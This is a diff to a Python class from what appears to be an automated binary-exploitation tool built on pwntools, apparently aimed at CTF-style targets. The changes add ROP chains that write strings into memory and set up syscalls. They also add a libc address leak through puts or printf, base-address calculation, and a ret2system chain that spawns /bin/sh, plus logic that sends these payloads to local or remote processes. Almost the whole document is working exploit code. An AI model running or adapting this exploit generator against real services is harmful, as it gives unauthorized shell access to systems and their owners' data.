@@ -1,6 +1,7 @@
 import logging
 import r2pipe
 import binaryninja as bn
+import re
 
 from pwn import *
 from binascii import *
@@ -23,8 +24,8 @@ class Against:
 
         self.binary = binary_path
         self.elf = ELF(self.binary)
-        self.libc_path = libc
         self.libc = libc
+            
         self.machine = machine
         self.ip = ip
         self.port = port
@@ -37,19 +38,26 @@ class Against:
         self.canary_offset_string = b""
         self.format_write_string = b""
 
+        self.has_libc_leak = False
+        self.libc_resolved = False
+        self.leak_function = None
+
         self.process = None
         
         self.format_exploit = None
         self.chain = None
         self.padding = None
+        self.libc_exploit = None
         self.exploit = None
 
     def start(self, option):
         """Return the running process to a binary."""
         gs = """
-            init-pwndbg
             set context-section disasm regs stack
-            b main
+
+            b vuln
+            finish
+
         """
 
         if option == "REMOTE":
@@ -60,17 +68,58 @@ class Against:
         else:
             return process(self.binary)
 
-    def rop_chain_write_string(self, string, writable_address):
+    def rop_chain_write_string(self, string, writeable_address):
         """Return a rop chain to write a string into the binary."""
         chain = b""
 
-        write_gadget = self.machine.find_write_gadget()
-        aegis_log.info(f"Using write gadget {write_gadget}")
-        write_gadget_address = int(write_gadget[0].split(b":")[0],16)
+        write_gadget, reg1, reg2 = self.machine.find_write_gadget()
+        aegis_log.info(f"Using write gadget {write_gadget} with {reg1}, {reg2} to {hex(writeable_address)}")
+        write_gadget_address = int(write_gadget.split(b":")[0],16)
 
         reg_params = self.machine.reg_args 
+        index = 0
+        while len(string) - index > 0:
+            print("first reg")
+            rem = (len(string) - index) % 8
+            reg_gadget = self.machine.find_reg_gadget(reg1.decode("utf-8"))
+            print(reg_gadget)
+            if reg_gadget != None:
+                for reg_gadget_str in reg_gadget:
+                    rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
+                    chain += rg_gadget + p64(writeable_address+index)
+                    instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
+                    for inst in instructions:
+                        if b"pop" in inst:
+                            print("pop")
+                            chain += b"A"*8
 
-
+            reg_gadget = self.machine.find_reg_gadget(reg2.decode("utf-8"))
+            print("second reg")
+            if reg_gadget != None:
+                for reg_gadget_str in reg_gadget:
+                    rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
+                    print("adding 2nd gadget")
+                    chain += rg_gadget + string[index:index+rem]
+                    instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
+                    for inst in instructions:
+                        if b"pop" in inst:
+                            reg = inst.strip(b" ").split(b" ")[1]
+                            if reg.decode("utf-8") == reg1:
+                                index = reg_params.index(reg.decode("utf-8"))
+                                print("pop 2")
+                                chain += p64(writeable_address+index) 
+                            else:
+                                print("pop 2")
+                                chain += b"B"* 8 
+            chain += p64(write_gadget_address)
+            instructions = write_gadget.split(b":")[1].split(b";")[1:]
+            print(write_gadget)
+            for inst in instructions:
+                if b"pop" in inst:
+                    print("pop 3")
+                    chain += b"C" * 8
+ 
+            index += 8
         return chain
 
     def rop_chain_syscall(self, parameters):
@@ -78,7 +127,6 @@ class Against:
         chain = b""
 
         reg_params = self.machine.sys_reg_args
-        print(reg_params)
 
 
         if len(parameters) > 0:
@@ -120,18 +168,15 @@ class Against:
                 reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
                 if reg_gadgets != None:
                     for reg_gadget_str in reg_gadgets:
-                        #print(reg_gadget_str + b" ", end=None)
                         reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
                         chain += reg_gadget + p64(parameters[i])
-                        #print(str(parameters[i]) + " ", end=None)
                         instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
-                        #print(instructions, end=None)
                         for inst in instructions:
                             if b"pop" in inst:
                                 reg = inst.strip(b" ").split(b" ")[1]
                                 if reg.decode("utf-8") in reg_params:
                                     index = reg_params.index(reg.decode("utf-8"))
-                                    chain += p64(parameters[index])
+                                    chain += p64(parameters[i])
                                 else:
                                     chain += p64(0)
 
@@ -147,31 +192,66 @@ class Against:
         """Return a rop chain that prints out a got address for a function."""
         chain = b""
 
-        leak_function = self.machine.find_functions(["puts", "printf"])[0]
+        self.leak_function = self.machine.find_functions(["puts", "printf"])[0]
         leak_gadget = int(self.machine.find_reg_gadget("rdi")[0].split(b":")[0].strip(), 16)
 
-        got_function = self.elf.got[leak_function]
-        plt_function = self.elf.plt[leak_function]
-        main = self.elf.sym["main"]
+        got_function = self.elf.got[self.leak_function]
+        plt_function = self.elf.plt[self.leak_function]
+        main = self.elf.sym["vuln"]
 
-        chain += p64(leak_gadget) + p64(got_function) + p64(plt_function)
-        chain += p64(main)
+        chain += p64(leak_gadget) + p64(got_function) 
+        if self.leak_function == "printf":
+            chain += p64(self.elf.sym["_fini"])
+            chain += p64(plt_function)
+            chain += p64(self.elf.sym["_fini"])
+            chain += p64(main)
+        else:
+            chain += p64(plt_function)
+            chain += p64(main)
 
-        aegis_log.info(f"Setting up libc leak with {leak_function}")
+        aegis_log.info(f"Setting up libc leak with {self.leak_function}")
+        self.has_libc_leak = True
 
         return chain 
+
+    def recv_libc_leak(self, p, symb):
+        
+        pattern = re.compile(b'.{5}\x7f')
+        match = None
+        while match == None: 
+            try:
+                output = p.recvline()
+            except EOFError:
+                aegis_log.info("Could not find libc leak")
+            match = pattern.search(output)
+
+        #aegis_log.info(f"Recieved leak from output {output}")
+        if match:
+            leak = match.group(0)
+            leak = u64(leak.ljust(8, b'\x00'))
+            aegis_log.info(f"Found libc leak {hex(leak)}")
+            libc_base = leak - self.libc.sym[symb]
+            aegis_log.info(f"Calculated libc base {hex(libc_base)}")
+
+            self.libc_resolved = True
+            return libc_base
+        else:
+            aegis_log.warning(f"Failed to get libc leak")
+            return None
 
     def rop_chain_libc(self, libc_base):
         """Return a ROP chain for ret2system in libc."""
         chain = b""
 
         r = ROP(self.libc)
-        system = p64(self.libc.sym["system"] + libc_base)
-        pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
-        ret = p64(u64(pop_rdi) + 1)
-        binsh = p64(next(self.libc.search(b"/bin/sh\x00")))
+        system = self.libc.sym["system"] + libc_base
+        pop_rdi = r.find_gadget(["pop rdi", "ret"])[0] + libc_base
+        ret = pop_rdi + 1
+        binsh = next(self.libc.search(b"/bin/sh\x00")) + libc_base
 
-        chain += pop_rdi + binsh + system
+        log.info(f"Pop Rdi {hex(pop_rdi)}\nSystem {hex(system)}\nBinsh {hex(binsh)}")
+
+        chain += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
 
         return chain
 
@@ -294,23 +374,31 @@ class Against:
 
     def send_exploit(self):
         """Send the exploit that was generated."""
-        #aegis_log.info(f"Sending exploit with padding {self.padding} and chain {self.chain}")
         self.exploit = self.padding + self.chain
 
         if self.exploit != None and self.format_exploit == None:
             aegis_log.info(f"Sending chain as {self.chain}") 
+            self.process.sendline(self.exploit)
+            if self.has_libc_leak == True:
+                libc_base = self.recv_libc_leak(self.process, self.leak_function)
+                if libc_base != None:
+                    self.libc_exploit = self.padding + self.rop_chain_libc(libc_base)
+
+                    aegis_log.info(f"Sending libc system chain {self.libc_exploit}")
+                    self.process.sendline(self.libc_exploit)
+
             if self.debug == True:
-                self.process.sendline(self.exploit)
                 self.process.interactive()
-            else:
-                self.process.sendline(self.exploit)
         else:
-            aegis_log.info(f"Sending format string exploit as {self.format_exploit}")
+            aegis_log.debug(f"Sending format string exploit as {self.format_exploit}")
+            self.process.sendline(self.format_exploit)
+            #if self.has_libc_leak == True:
+                #libc_base = self.recv_libc_leak(self.process, self.leak_function)
+                #chain = self.rop_chain_libc(libc_base)
+                #aegis_log.info(f"Sending libc system chain {self.chain}")
+                #self.process.sendline(chain)
             if self.debug == True:
-                self.process.sendline(self.format_exploit)
                 self.process.interactive()
-            else:
-                self.process.sendline(self.format_exploit)
 
 
     def verify_flag(self):
